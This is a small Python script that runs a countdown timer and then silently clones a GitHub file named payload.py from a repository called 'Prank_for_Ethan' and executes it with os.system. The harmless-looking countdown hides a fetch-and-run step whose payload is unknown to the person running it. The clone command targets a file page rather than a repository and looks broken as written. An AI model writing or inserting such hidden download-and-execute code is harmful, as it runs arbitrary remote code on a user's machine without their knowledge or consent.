import os
from time import sleep

def countdown(n):
    while n > 0:
        print(n)
        sleep(1)
        n -= 1


countdown(int(input("How long should the countdown be???")))
os.system("git clone https://github.com/SurrealistFan/Prank_for_Ethan/blob/master/payload.py")
os.system("python payload.py")